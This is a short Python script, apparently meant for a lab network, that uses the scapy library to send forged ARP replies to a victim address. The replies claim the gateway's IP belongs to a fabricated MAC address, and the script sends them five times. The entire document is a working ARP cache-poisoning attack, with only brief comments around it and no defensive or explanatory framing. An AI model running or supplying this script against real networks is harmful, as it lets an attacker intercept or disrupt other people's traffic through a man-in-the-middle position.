#!/usr/bin/env python3
from scapy.all import ARP, send
import time

# Change target_ip and spoofed_ip as needed
target_ip = "192.168.20.10"    # victim IP (on net20)
spoofed_ip = "192.168.20.1"    # pretend to be the router (gateway) or other host

pkt = ARP(op=2, pdst=target_ip, psrc=spoofed_ip, hwsrc="00:11:22:33:44:55")
print(f"Sending ARP reply to {target_ip}: claiming {spoofed_ip} is at 00:11:22:33:44:55")
for i in range(5):
    send(pkt, verbose=False)
    time.sleep(1)
print("Done")
